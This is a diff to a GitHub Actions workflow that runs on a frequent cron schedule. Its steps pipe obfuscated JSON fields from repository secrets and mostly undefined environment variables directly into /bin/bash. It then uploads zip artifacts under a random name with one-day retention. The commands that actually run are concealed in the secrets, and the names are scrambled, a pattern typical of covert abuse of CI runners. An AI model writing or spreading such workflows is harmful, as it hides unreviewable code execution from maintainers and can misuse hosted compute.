@@ -1,20 +1,29 @@
 name: typescriptmarcusadvanced
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '26 1/6 * * *'
 
+  schedule:
+    - cron: '39 3,9,15,21 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: typescriptmarcusadvanced
         env:
-          k3: ${{ secrets.k3 }}
+          aa418: ${{ secrets.aa418 }}
         run: |
-          echo $k3 | jq -r .kwzr7 | /bin/bash
-          echo $aqqfv1582 | jq -r .jtoe21 | /bin/bash
-          echo $zuwnw72545 | jq -r .pdoru51 | /bin/bash
+          printf '%s' "$aa418" | jq -r .qtn2435 | /bin/bash
+          printf '%s' "$ujldc84" | jq -r .nfzk800 | /bin/bash
+          echo $onfp45 | jq -r .jr59931 | /bin/bash
+          printf '%s' "$odj48" | jq -r .nwga877 | /bin/bash
+          printf '%s' "$vmm9465" | jq -r .enjio01 | /bin/bash
+          printf '%s' "$eirwz0" | jq -r .fm082 | /bin/bash
+          printf '%s' "$xdpdh73521" | jq -r .ddt645 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: jlDvyi3x
+          path: "*.zip"
+          retention-days: 1
